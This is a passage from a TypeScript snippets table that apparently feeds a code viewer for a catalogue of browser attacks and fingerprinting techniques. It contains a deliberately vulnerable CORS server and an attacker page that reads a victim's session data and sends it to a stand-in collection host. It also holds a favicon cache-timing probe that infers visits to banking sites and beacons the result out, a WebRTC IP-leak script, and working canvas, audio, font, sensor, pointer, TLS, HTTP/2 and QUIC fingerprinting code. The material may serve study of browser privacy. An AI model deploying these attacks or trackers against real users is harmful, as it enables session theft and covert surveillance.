app.use((req, res, next) => {
  const origin = req.get('Origin');
  if (origin) {
    res.set('Access-Control-Allow-Origin', origin);  // reflection!
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  }
  next();
});

app.get('/sensitive', (req, res) => {
  // req.cookies has the victim's cookies attached
  res.json({ token: req.cookies.session });
});
app.listen(3036);`,

  "cors-html": `<!DOCTYPE html>
<html><body>
<script>
  // From attacker.com — read victim's data from target.com
  fetch('https://target.example.com/sensitive', {
    credentials: 'include'
  }).then(r => r.json()).then(d => {
    // Exfil
    new Image().src = 'https://collect.example.com/?' + JSON.stringify(d);
  });
</script>
</body></html>`,

  // ── FINGERPRINT ─────────────────────────────────────────────────────────────
  "cv-probe": `// canvas_probe.js — 2D rendering fingerprint
// BSCA Type: P (passive) | Phase: 0 | Persist: HIGH

export async function canvasFingerprint() {
  const c   = document.createElement('canvas');
  c.width   = 280;
  c.height  = 60;
  const ctx = c.getContext('2d');

  // Text rendering — font hinting differs per OS/GPU
  ctx.fillStyle   = '#f60';
  ctx.fillRect(125, 1, 62, 20);
  ctx.fillStyle   = '#069';
  ctx.font        = '11pt "Arial"';
  ctx.fillText('Cwm fjordbank glyphs vext quiz, \\u2764', 2, 15);

  // Shape + gradient
  ctx.fillStyle   = 'rgba(102,204,0,0.7)';
  ctx.beginPath();
  ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
  ctx.closePath();
  ctx.fill();

  // Shadow rendering
  ctx.shadowOffsetX = 2;
  ctx.shadowColor   = 'blue';
  ctx.fillStyle     = 'rgba(255,0,255,0.5)';
  ctx.fillRect(0, 30, 6, 6);
  ctx.fillRect(2, 0, 4, 4);

  const raw  = c.toDataURL();
  const hash = await digest(raw);
  return { raw: raw.slice(0, 32) + '…', hash, w: c.width, h: c.height };
}

async function digest(str) {
  const buf  = await crypto.subtle.digest(
    'SHA-256', new TextEncoder().encode(str)
  );
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 16);
}`,

  "cv-hash": `// hash.js — short stable hash from a canvas data URL
export async function sha256short(s) {
  const buf = await crypto.subtle.digest('SHA-256',
    new TextEncoder().encode(s));
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('')
    .slice(0, 16);
}`,

  "cv-coll": `// collect.js — collect canvas + ship to backend
import { canvasFingerprint } from './probe.js';

const fp = await canvasFingerprint();
navigator.sendBeacon('/fp/collect', JSON.stringify({
  type: 'canvas', hash: fp.hash, ts: Date.now(),
}));`,

  "wg-probe": `// webgl_probe.js — WebGL GPU fingerprint
export function webglFingerprint() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (!gl) return { supported: false };

  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    supported: true,
    vendor:   gl.getParameter(gl.VENDOR),
    renderer: gl.getParameter(gl.RENDERER),
    unmaskedVendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : null,
    unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL): null,
    version:  gl.getParameter(gl.VERSION),
    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
    extensions: gl.getSupportedExtensions(),
  };
}`,

  "wg-ext": `// extensions.js — probe WebGL extension support
export function extensions() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl');
  if (!gl) return [];
  return gl.getSupportedExtensions() || [];
}`,

  "au-probe": `// audio_probe.js — OfflineAudioContext fingerprint
// BSCA Type: P | Phase: 1 (async) | Persist: HIGH
// Mechanism: oscillator output varies by OS audio stack + CPU

export async function audioFingerprint() {
  const ctx = new OfflineAudioContext(1, 44100, 44100);

  const osc = ctx.createOscillator();
  osc.type  = 'triangle';
  osc.frequency.setValueAtTime(10000, ctx.currentTime);

  const comp = ctx.createDynamicsCompressor();
  comp.threshold.setValueAtTime(-50,  ctx.currentTime);
  comp.knee.setValueAtTime(40,        ctx.currentTime);
  comp.ratio.setValueAtTime(12,       ctx.currentTime);
  comp.attack.setValueAtTime(0,       ctx.currentTime);
  comp.release.setValueAtTime(0.25,    ctx.currentTime);

  osc.connect(comp);
  comp.connect(ctx.destination);
  osc.start(0);

  const rendered = await ctx.startRendering();
  const data     = rendered.getChannelData(0);

  // Sum a slice of the Float32 output — the sum is implementation-specific
  let sum = 0;
  for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);

  return {
    sum:   sum.toFixed(10),
    hash:  hashFloat(sum),
    sr:    rendered.sampleRate,
    len:   rendered.length,
  };
}

function hashFloat(f) {
  const s = f.toFixed(15);
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (Math.imul(31, h) + s.charCodeAt(i)) | 0;
  return (h >>> 0).toString(16);
}`,

  "au-worker": `// worker.js — off-main-thread audio rendering
self.onmessage = async () => {
  const ctx = new OfflineAudioContext(1, 44100, 44100);
  const osc = ctx.createOscillator();
  osc.type = 'triangle';
  osc.frequency.value = 10000;
  osc.connect(ctx.destination);
  osc.start(0);
  const rendered = await ctx.startRendering();
  const data = rendered.getChannelData(0);
  let sum = 0;
  for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
  self.postMessage({ sum: sum.toFixed(10) });
};`,

  "ft-probe": `// font_probe.js — measure font availability via offsetWidth
const TEST = 'mmmmmmmmmmlli';
const FONTS = ['Arial','Helvetica','Times','Courier','Comic Sans MS','Impact',
               'Verdana','Georgia','Palatino','Garamond','Bookman','Tahoma',
               'Trebuchet MS','Monaco','Consolas','Menlo','SF Pro','Segoe UI'];

export function probeFonts() {
  const base = document.createElement('span');
  base.style.cssText = 'font-size:72px;visibility:hidden;position:absolute;';
  base.textContent = TEST;
  document.body.appendChild(base);

  // Reference size in monospace
  base.style.fontFamily = 'monospace';
  const refW = base.offsetWidth;
  base.style.fontFamily = 'serif';
  const refS = base.offsetWidth;

  const results: Record<string, boolean> = {};
  for (const f of FONTS) {
    base.style.fontFamily = f + ', monospace';
    // If width changes from monospace reference, the font is installed
    results[f] = base.offsetWidth !== refW;
  }
  base.remove();
  return results;
}`,

  "ft-base": `// baseline.js — baseline font metrics
const BASES = ['monospace','serif','sans-serif','cursive','fantasy'];
export function baseline() {
  const el = document.createElement('span');
  el.style.cssText = 'font-size:72px;visibility:hidden;';
  el.textContent = 'mmmmmmmmmmlli';
  document.body.appendChild(el);
  const out: Record<string, number> = {};
  for (const b of BASES) {
    el.style.fontFamily = b;
    out[b] = el.offsetWidth;
  }
  el.remove();
  return out;
}`,

  "nv-probe": `// nav_probe.js — collect navigator.* properties
export function probe() {
  return {
    userAgent: navigator.userAgent,
    platform:   navigator.platform,
    language:   navigator.language,
    languages:  navigator.languages,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: (navigator as any).deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    appVersion: navigator.appVersion,
    oscpu: (navigator as any).oscpu,
    buildID: (navigator as any).buildID,
    doNotTrack: navigator.doNotTrack,
    cookieEnabled: navigator.cookieEnabled,
    webdriver: navigator.webdriver,
    pdfViewer: (navigator as any).pdfViewerEnabled,
  };
}`,

  "nv-parse": `// parse.js — derive bits from navigator probe
export function bits(n: any) {
  let h = 0;
  h ^= strHash(n.userAgent);
  h ^= strHash(n.platform);
  h ^= strHash(n.language);
  h ^= (n.hardwareConcurrency || 0) * 17;
  h ^= (n.deviceMemory || 0) * 23;
  h ^= (n.maxTouchPoints || 0) * 7;
  return { hash: (h >>> 0).toString(16), bits: popcount(h) };
}
function strHash(s) { let h=0; for (const c of s||'') h=Math.imul(31,h)+c.charCodeAt(0)|0; return h; }
function popcount(n) { let c=0; while(n){c+=n&1;n>>>=1;} return c; }`,

  "bt-probe": `// probe.js — Battery API fingerprint
// Some browsers return identical battery state per session
export async function probe() {
  if (!navigator.getBattery) return { supported: false };
  const b = await navigator.getBattery();
  return {
    supported: true,
    level: b.level,
    charging: b.charging,
    chargingTime: b.chargingTime,
    dischargingTime: b.dischargingTime,
  };
}`,

  "sn-probe": `// probe.js — Sensor API (accelerometer/gyroscope)
// Requires Permissions API in modern browsers
export async function probe() {
  if (!('Accelerometer' in window)) return { supported: false };
  try {
    const sensor = new Accelerometer({ frequency: 60 });
    const samples: number[] = [];
    sensor.addEventListener('reading', () => {
      samples.push(sensor.x || 0, sensor.y || 0, sensor.z || 0);
      if (samples.length > 600) sensor.stop();
    });
    sensor.start();
    await new Promise(r => setTimeout(r, 5000));
    sensor.stop();
    // Hash the sample distribution — varies by device
    return {
      supported: true,
      sampleCount: samples.length,
      sum: samples.reduce((a,b)=>a+b, 0).toFixed(6),
      hash: hashSamples(samples),
    };
  } catch (e) { return { supported:false, err: String(e) }; }
}
function hashSamples(s: number[]) {
  let h = 0;
  for (const v of s) h = Math.imul(31, h) + Math.round(v * 1e6) | 0;
  return (h >>> 0).toString(16);
}`,

  "sn-an": `// analyze.js — cluster sensor samples to derive stable bits
import { probe } from './probe.js';

const RUNS = 5;
export async function stable() {
  const runs = await Promise.all(Array.from({length:RUNS}, probe));
  // Take runs that agree in first 8 chars of hash
  const hashes = runs.map(r => r.hash || '').slice(0, 8);
  return { hashes, stable: new Set(hashes).size === 1 };
}`,

  "pt-probe": `// probe.js — pointer trajectory fingerprint
// Tracks mouse movements for 5 seconds; derives entropy from path
let pts: number[] = [];
let running = false;

export function start() {
  running = true;
  window.addEventListener('pointermove', onMove);
  return new Promise(resolve => setTimeout(() => {
    running = false;
    window.removeEventListener('pointermove', onMove);
    resolve(analyze(pts));
  }, 5000));
}

function onMove(e: PointerEvent) {
  if (!running) return;
  pts.push(e.clientX, e.clientY, e.pressure || 0, e.tiltX || 0, e.tiltY || 0);
}

function analyze(pts: number[]) {
  // Velocity histogram (5 buckets) → 5 bits
  const vels: number[] = [];
  for (let i = 2; i < pts.length; i += 5) {
    const dx = pts[i] - pts[i-5];
    const dy = pts[i+1] - pts[i-4];
    vels.push(Math.sqrt(dx*dx + dy*dy));
  }
  vels.sort((a,b)=>a-b);
  const buckets = [0,0,0,0,0];
  for (const v of vels) buckets[Math.min(4, Math.floor(v/15))]++;
  let h = 0;
  buckets.forEach((b,i) => h |= (b & 3) << (i*2));
  return { hash: (h>>>0).toString(16), samples: pts.length / 5 };
}`,

  "tm-probe": `// probe.js — high-resolution timer fingerprint
// performance.now() resolution varies by browser; some browsers quantize
export function probe() {
  const N = 1000;
  const t0 = performance.now();
  for (let i = 0; i < N; i++) performance.now();
  const t1 = performance.now();
  // t1-t0 should be near zero; the actual resolution is what we read
  return {
    elapsed_us: ((t1 - t0) * 1000 / N).toFixed(3),
    now: performance.now(),
    dateNow: Date.now(),
    timeOrigin: performance.timeOrigin,
  };
}`,

  "st-probe": `// probe.js — storage quota estimation
export async function probe() {
  if (!navigator.storage?.estimate) return { supported: false };
  const est = await navigator.storage.estimate();
  return {
    supported: true,
    quota: est.quota,
    usage: est.usage,
    usageRatio: est.usage && est.quota ? est.usage / est.quota : null,
  };
}`,

  // ── NETWORK ─────────────────────────────────────────────────────────────────
  "ja-conf": `# nginx_ja3.conf — JA3 fingerprint logging via nginx + lua
load_module modules/ngx_http_js_module.so;

env JA3_LOG_PATH;

http {
  js_import ja3.js;

  log_format ja3 '$remote_addr - $remote_user [$time_local] '
                  '"$request" $status $body_bytes_sent '
                  'ja3="$ja3_hash" ja4="$ja4_hash"';

  server {
    listen 443 ssl;
    ssl_protocols TLSv1.2 TLSv1.3;

    # Compute JA3 in access log
    access_log /var/log/nginx/ja3.log ja3;

    # Lua hook on TLS handshake
    ssl_certificate     /etc/ssl/cert.pem;
    ssl_certificate_key /etc/ssl/key.pem;

    location / {
      proxy_pass http://backend;
    }
  }
}`,

  "ja-py": `# parse_ja3.py — parse nginx JA3 log into structured records
import re, json, sys

LINE = re.compile(
  r'(?P<ip>\\S+).*"\\S+ (?P<path>\\S+).*ja3="(?P<ja3>[^"]*)" ja4="(?P<ja4>[^"]*)"'
)

def parse(log: str) -> list[dict]:
  out = []
  for line in log.splitlines():
    m = LINE.match(line)
    if m:
      out.append({
        'ip': m['ip'], 'path': m['path'],
        'ja3': m['ja3'], 'ja4': m['ja4'],
      })
  return out

if __name__ == '__main__':
  print(json.dumps(parse(sys.stdin.read()), indent=2))`,

  "h2-cap": `# h2_cap.py — capture HTTP/2 SETTINGS frame
# Uses h2 library to inspect raw h2 frames
import socket, ssl, struct

def capture(host: str, port: int = 443) -> dict:
  ctx = ssl.create_default_context()
  ctx.set_alpn_protocols(['h2'])
  sock = socket.create_connection((host, port))
  ssock = ctx.wrap_socket(sock, server_hostname=host)
  # Send client preface
  ssock.send(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')
  # Send empty SETTINGS
  ssock.send(struct.pack('>I', 0)[1:] + b'\\x04\\x00\\x00\\x00\\x00\\x00\\x00')
  # Read server SETTINGS
  frame = ssock.recv(9)
  length = int.from_bytes(frame[:3], 'big')
  ftype = frame[3]
  body = ssock.recv(length)
  settings = {}
  for i in range(0, len(body), 6):
    k = int.from_bytes(body[i:i+2], 'big')
    v = int.from_bytes(body[i+2:i+6], 'big')
    settings[k] = v
  return { 'settings': settings }`,

  "h2-parse": `# parse.py — derive fingerprint from h2 settings
def fingerprint(settings: dict) -> str:
  # Akamai's h2 fingerprint: ordered list of (setting_id, value)
  parts = [f'{k}-{v}' for k, v in sorted(settings.items())]
  return ','.join(parts)`,

  "ft-probe2": `// timing_probe.js — favicon cache timing attack
// BSCA Observe: T (timing) | Phase: 1 | Persist: NONE
// Determines whether a favicon URL is cached (and thus visited)

const PROBE_URLS = [
  'https://target.example.com/favicon.ico',
  'https://bank.example.com/favicon.ico',
  // add more targets
];

async function probeCache(url) {
  const img   = new Image();
  const start = performance.now();

  return new Promise(resolve => {
    img.onload = img.onerror = () => {
      const delta = performance.now() - start;
      // Cached: delta < ~5ms. Uncached: delta > 30ms (network round-trip)
      resolve({ url, delta: delta.toFixed(2), cached: delta < 12 });
    };
    img.src = url + '?_=' + Math.random();
  });
}

export async function runProbes() {
  const results = await Promise.all(PROBE_URLS.map(probeCache));
  const visited = results.filter(r => r.cached).map(r => r.url);
  await navigator.sendBeacon('/fp/collect', JSON.stringify({
    ts: Date.now(), type: 'favicon-timing', visited, raw: results,
  }));
  return { visited, results };
}`,

  "ft-html": `<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>cache probe</title></head>
<body>
  <script type="module">
    import { runProbes } from './timing_probe.js';
    const r = await runProbes();
    document.body.innerText = 'visited: ' + r.visited.length;
  </script>
</body></html>`,

  "wr-probe": `// probe.js — WebRTC IP leak
// BSCA Type: P | Phase: 1 | Persist: SESSION
export async function probe() {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
  });
  pc.createDataChannel('leak');

  const ips: string[] = [];
  pc.onicecandidate = e => {
    if (!e.candidate) return;
    const m = e.candidate.candidate.match(/([0-9a-f.:]+)\\s+typ/s);
    if (m && !ips.includes(m[1])) ips.push(m[1]);
  };

  pc.createOffer().then(o => pc.setLocalDescription(o));

  // Wait for ICE gathering to complete
  await new Promise(r => pc.onicegatheringstatechange = () => {
    if (pc.iceGatheringState === 'complete') r(null);
  });
  pc.close();
  return { ips, publicIps: ips.filter(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.') && !ip.startsWith('fd')) };
}`,

  "wr-stun": `// stun.js — minimal STUN client
// Used by WebRTC probe to discover public IP
export async function stun(server = 'stun.l.google.com:19302') {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + server }] });
  pc.createDataChannel('s');
  pc.createOffer().then(o => pc.setLocalDescription(o));
  return new Promise<string[]>(resolve => {
    const ips: string[] = [];
    pc.onicecandidate = e => {
      if (!e.candidate) { pc.close(); resolve(ips); return; }
      const m = /([0-9a-f.:]+)\\s+typ srflx/.exec(e.candidate.candidate);
      if (m) ips.push(m[1]);
    };
  });
}`,

  "qu-probe": `// probe.js — QUIC / HTTP/3 fingerprint
// Connect to an h3 endpoint, observe transport parameters
export async function probe(url: string) {
  // Use the WebTransport API where available
  if ('WebTransport' in window) {
    const t = new WebTransport(url);
    try {
      await t.ready;
      return { supported: true, ready: true };
    } catch (e) {
      return { supported: true, error: String(e) };
    }
  }
  return { supported: false };
}`,

  "qu-srv": `# server.py — aioquic-based QUIC server for fingerprinting
from aioquic.asyncio import serve
from aioquic.quic.configuration import QuicConfiguration

async def main():
  config = QuicConfiguration(is_server=True)
  config.load_cert_chain('cert.pem', 'key.pem')

  async def handler(reader, writer):
    # Inspect writer._protocol._quic.get_transport_parameters()
    print(writer._protocol._quic.get_transport_parameters())
    await reader.recv()

  await serve('0.0.0.0', 443, configuration=config, create_protocol=handler)
  await asyncio.Future()

import asyncio
asyncio.run(main())`,

  "doh-probe": `// probe.js — DNS-over-HTTPS resolver detection
// Different DoH providers have unique response times + cache behavior
const DOH_SERVERS = {
  cloudflare: 'https://cloudflare-dns.com/dns-query',
  google:     'https://dns.google/dns-query',
  quad9:      'https://dns.quad9.net/dns-query',
  adguard:    'https://dns.adguard.com/dns-query',
};

export async function probe(domain = 'example.com') {
  const results: Record<string, number> = {};
  for (const [name, url] of Object.entries(DOH_SERVERS)) {
    const t0 = performance.now();
    try {
      await fetch(url + '?name=' + domain + '&type=A', {
        headers: { 'accept': 'application/dns-json' },
      });
      results[name] = performance.now() - t0;
    } catch {
      results[name] = -1;
    }
  }
  return results;
}`,

  "doh-srv": `// server.js — log DoH probe hits (server-side)
const http = require('http');
http.createServer((req, res) => {
  console.log('[doh]', req.socket.remoteAddress, req.url);
  // Echo back a minimal valid DoH JSON response
  res.setHeader('content-type', 'application/dns-json');
  res.writeHead(200);
  res.end(JSON.stringify({
    Status: 0, TC: false, RD: true, RA: true,
    Answer: [{ name: 'example.com', type: 1, TTL: 300, data: '1.2.3.4' }],
  }));
}).listen(3037);`,

  "h3-probe": `// probe.js — HTTP/3 client fingerprint via WebTransport
export async function probe(url: string) {
  if (!('WebTransport' in window)) return { supported: false };
  const t = new WebTransport(url);
  try {
    const start = performance.now();
    await t.ready;
    const ready_ms = performance.now() - start;
    return { supported: true, ready_ms };
  } catch (e) { return { supported: true, err: String(e) }; }
}`,

  "h3-parse": `# parse.py — derive fingerprint from h3 transport parameters
# Captured at the server via aioquic
def fingerprint(tp: dict) -> str:
  keys = ['original_destination_connection_id',
          'max_idle_timeout', 'stateless_reset_token',
          'max_udp_payload_size', 'initial_max_data',
          'initial_max_stream_data_bidi_local',
          'initial_max_stream_data_bidi_remote',
          'initial_max_stream_data_uni',
          'initial_max_streams_bidi', 'initial_max_streams_uni',
          'ack_delay_exponent', 'max_ack_delay',
          'disable_active_migration', 'active_connection_id_limit']
  return ','.join(f'{k}={tp.get(k,"-")}' for k in keys)`,

  "ntp-net-probe": `# probe.py — NTPv4 packet, measure clock skew
import socket, struct, time

def probe(server='pool.ntp.org', port=123):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.settimeout(5)
  # NTPv4 client packet
  pkt = bytearray(48)
  pkt[0] = 0x1B  # li=0, vn=3, mode=3 (client)
  t0 = time.time()
  s.sendto(bytes(pkt), (server, port))
  data, _ = s.recvfrom(1024)
  t1 = time.time()
  # Server-side transmit timestamp is at offset 40
  secs = struct.unpack('!I', data[40:44])[0] - 2208988800
  frac = struct.unpack('!I', data[44:48])[0] / 2**32
  server_time = secs + frac
  rtt = t1 - t0
  skew = server_time - (t0 + rtt/2)
  return { server_time, rtt, skew }`,

  "ntp-net-srv": `# server.py — minimal NTP server for clock-skew detection
# Uses ntplib's server mode
import socket, struct, time

def serve(port=123):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.bind(('0.0.0.0', port))
  while True:
    data, addr = s.recvfrom(1024)
    t = time.time()
    secs = int(t) + 2208988800
    frac = int((t - int(t)) * 2**32)
    reply = bytearray(48)
    reply[0] = 0x24  # li=0, vn=4, mode=4 (server)
    struct.pack_into('!IIIIIIII', reply, 40, secs, frac, secs, frac, secs, frac)
    s.sendto(bytes(reply), addr)`,
};

// Fallback code for unspecified files
export function defaultCode(name: string, lang?: string): string {
  const map: Record<string, string> = {
    js:  `// ${name}\n// BSCA stub — no content loaded\n// Add a snippet keyed by this file's id in snippets.ts\n`,
    ts:  `// ${name}\n// TypeScript source — stub\n`,
    py:  `# ${name}\n# Python source — stub\n`,
    html:`<!-- ${name} -->\n<!-- HTML stub -->\n`,
    xml: `<?xml version="1.0"?>\n<!-- ${name} -->\n`,
    json:`{\n  "_comment": "${name}"\n}\n`,
    conf:`# ${name}\n# Configuration stub\n`,
    txt: `${name}\n`,
    vb:  `' ${name}\nSub Main()\n  ' stub\nEnd Sub\n`,
    css: `/* ${name} */\n/* CSS stub */\n`,
    tsx: `// ${name}\nimport React from 'react';\nexport default function() { return null; }\n`,
    bin: `; binary artifact — not editable\n; open in hex view\n`,
  };
  return map[lang || ''] || `; ${name}\n`;
}

export function getCode(fileId?: string, fileName?: string, lang?: string): string {
  if (fileId && CODE[fileId]) return CODE[fileId];
  return defaultCode(fileName || 'untitled', lang);
}


